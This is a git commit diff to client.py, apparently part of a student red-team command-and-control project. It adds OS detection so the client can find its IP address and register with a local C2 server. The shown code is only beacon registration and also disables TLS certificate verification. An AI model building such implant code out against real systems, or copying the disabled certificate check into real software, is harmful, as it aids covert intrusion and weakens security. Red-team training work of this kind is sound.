0c0c2ec32968408f2cb1d3e888368dea7bdd98f1
Leah Kvares <lk3053@rit.edu>
2024-04-16 18:07:13 -0400

    client os detection

--- client.py
+++ client.py
@@ -1,15 +1,17 @@
 import requests
 import subprocess
 import time
+import platform
 
 SERVER_URL = "http://127.0.0.1:5005"
 CLIENT_ID = None
 
 # client reaches out to server to get told its ID
 def register():
-    ip = subprocess.run("ifconfig | grep 129 | grep inet | awk '{print $2}'", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip() # get ip
-
-    #TODO: add stuff to account for distro (hostname -I)
+    if (platform.system() == 'Darwin'): # mac
+        ip = subprocess.run("ifconfig | grep 129 | grep inet | awk '{print $2}'", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
+    elif (platform.system() == "Linux"):
+        ip = subprocess.run("hostname -I", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
 
     # response = requests.get(f"{SERVER_URL}/log-client", params={'client_id': ip}, verify='/Users/leahk/workspace/projects/redteam/C2/cert.pem') # send ip
     response = requests.get(f"{SERVER_URL}/register-client", params={'client_id': ip}, verify=False)
